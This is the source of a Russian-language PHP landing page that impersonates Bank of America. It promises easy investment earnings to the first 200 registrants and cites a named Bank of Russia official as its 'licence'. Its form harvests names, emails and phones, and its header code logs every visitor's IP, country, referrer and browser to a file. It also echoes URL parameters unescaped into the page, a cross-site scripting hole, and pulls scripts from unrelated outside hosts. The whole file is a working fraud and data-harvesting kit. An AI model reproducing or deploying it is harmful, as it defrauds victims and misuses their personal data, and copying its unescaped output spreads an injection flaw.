<?php
	$FacebookPixel = $_GET['p'];
	$Ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	$http_lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);
	$fd = fopen("../logs.txt", 'a+');
	$date = date('d.m.Y, H:i:s');
	$arr = $date.'|'.$_SERVER['HTTP_CF_IPCOUNTRY'].'|'.$http_lang.'|'.$_SERVER['HTTP_REFERER'].'|'.$_SERVER['HTTP_USER_AGENT'].'|'.$Ip."|land \r\n";
	fwrite($fd, $arr);
	fclose($fd);
	$gp = $_GET['gp'];
  $hs = $_GET['hs'];
  $page_lang = "ru";
	$QUERY=$_SERVER["QUERY_STRING"];
?>
<!DOCTYPE html>
<html lang="<?php echo $page_lang; ?>">
<!-- <html lang="ru"> -->

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://usahomerelief.net/adict/intlTelInput.css">
  <link rel="stylesheet" href="https://usahomerelief.net/adict/adict.css">

  <title>Банк Америка</title>
<link href="assets/css/styles.910192ab5a1fb9d07a87.css" rel="stylesheet"></head>

<body class="page">
  <section class="header">
  <div class="container">

    <img src="assets/img/6c2b7eaf42eee192bd79.png" alt="" class="header__logo1">
    <img src="assets/img/2ac48bc62396c43a10b2.png" alt="" class="header__logo2">

    <img src="assets/img/8fc63b5ca51584e4df6f.png" alt="" class="header__logo1-desk">
    <img src="assets/img/a8a0c40d3c64cfc7544b.png" alt="" class="header__logo2-desk">

  </div>
</section>
    <section class="first">
  <div class="container">

    <div class="first__video-container">
      <video id="video" autoplay muted controls src="https://wtcprojects.com/video/tinkoff_v5.mp4" loop preload="auto" class="first__video"></video>
    </div>

    <form method="POST" action="thanks/index.php" class="form" id="form">
      <h1 class="form__title">Заполните форму <br>ПРЯМО СЕЙЧАС
      </h1>
      <div class="input_wrapper">
        <div>
          <input name="f_name" placeholder="Ваше имя">
        </div>
        <div>
          <input name="l_name" placeholder="Ваша фамилия">
        </div>
        <div>
          <input type="email" name="email" placeholder="Ваш e-mail">
        </div>
        <style>
          .iti__flag-container {
            z-index: 50;
          }

          .iti-mobile .iti__country-list {
            width: 85%;
          }
        </style>
        <input type="tel" name="phone" placeholder="Ваш телефон" autocomplete="off" required>
        <input type="hidden" name="phone2" class="phone2" autocomplete="off" required>
        <input type="hidden" name="pixel_id" value="<?php echo $FacebookPixel?>">
        <input type="hidden" name="page_lang" value="<?php echo $page_lang?>">
        <input type="hidden" name="query" value="<?php echo $QUERY?>">
        <input type="hidden" name="gp_id" value="<?php echo $gp?>">
        <input type="hidden" name="hs_id" value="<?php echo $hs?>">
        <input type="hidden" name="landing" value="BANK-AMERICA">

        <button class="form__btn" type="submit">
          Подать заявку
        </button>
      </div>
    </form>

  </div>
</section>
      <section class="second">
    <div class="container">
        <div class="second__box">
            <h2 class="second__title">В течении одного месяца, вы будете зарабатывать вместе с Bank of America</h2>
            <p class="second__text">В честь нашего открытия в РФ, мы создали эту платформу, где на 200 первых
                зарегистрировавшихся пользователей
                будут
                работать наши лучшие аналитики и ведущие инвесторы. С их помощью, вы своими руками заработаете десятки
                тысяч
                долларов на
                инвестировании! Всё что для этого нужно - <span class="second__text--part">слушать, выполнять и
                    повторять!</span></p>
        </div>
        <img src="assets/img/09f919b30ed4e9e60882.png" alt="" class="second__img">
        <img src="assets/img/44680db5c5dbcd6be1f5.png" alt="" class="second__img-desk">
    </div>
</section>
        <section class="third">

  <div class="third__box third__box-one">
    <div class="container">
      <h2 class="third__title">Для чего это нам?</h2>
      <p class="third__text">Многие граждане России с опаской относятся к американским компаниям. Мы надеемся, что такой
        жест с нашей
        стороны покажет
        россиянам, что нам нет дела до политических интриг, нам важно лишь мнение простых людей. Мы делаем это для вас!
        Кроме
        того, по завершению работы этой программы Bank of America будет предоставлять услуги по управлению деньгами и
        обучающие
        курсы. На примере вашего успеха, вся Россия увидит на что мы способны.</p>
      <button type="button" class="third__btn scroll-btn">Подать заявку</button>
    </div>
  </div>

  <div class="third__box third__box-two">
    <div class="container">
      <h2 class="third__title">Чего же вы ждёте?!</h2>
      <p class="third__text">Не беспокойтесь о том, что вы не имеете соответствующего образования или опыта в сфере
        инвестирования. Вам всё объяснят,
        а курировать вас будут наши лучшие специалисты. К концу работы программы вы получите не просто деньги, но и
        бесценные
        знания в сфере инвестирования и <span class="third__text--part">вы сможете сами зарабатывать</span> большие
        деньги на фондовом рынке.</p>
      <button type="button" class="third__btn scroll-btn">Подать заявку</button>
    </div>
  </div>

</section>
          <section class="fourth">
  <div class="container">
    <img src="assets/img/cfb824ceb7fe8dd139a8.png" alt="" class="fourth__img2-desk">
    <div class="fourth__box">
      <h2 class="fourth__title">Наша лицензия</h2>
      <img src="assets/img/7caa0560f40dd13e1b72.png" alt="" class="fourth__img1">
      <img src="assets/img/92effe23f932d4c2ea26.png" alt="" class="fourth__img1-desk">
      <p class="fourth__img1-title">Швецов Сергей Анатольевич</p>
      <p class="fourth__img1-descr">Первый заместитель Председателя Банка России</p>
    </div>
    <img src="assets/img/b2762057aa746b40e8ba.png" alt="" class="fourth__img2">
  </div>
</section>
            <footer class="footer">
  <div class="container">

    <h2 class="footer__title">Остались вопросы?</h2>
    <p class="footer__text">Оставьте заявку на регистрацию и наши консультанты
      свяжутся с вами в ближайшее время
    </p>
    <button class="footer__btn scroll-btn">Подать заявку</button>

  </div>
</footer>

              <script src="./assets/js/jquery-3.5.1.min.js"></script>
              <script src="https://usahomerelief.net/adict/intlTelInput.js"></script>
              <script src="https://usahomerelief.net/adict/adict.js"></script>
              <script src="https://usahomerelief.net/adict/utils.js"></script>
              <script src="https://usahomerelief.net/video/video.js"></script>

              <script>
                $(".scroll-btn").each(function () {
                  $(this).click((e) => {
                    e.preventDefault();
                    $("html").animate(
                      {
                        scrollTop: $("#form").offset().top,
                      },
                      800
                    );
                  });
                });
              </script>
<script defer src="assets/js/index.910192ab5a1fb9d07a87.js"></script></body>

</html>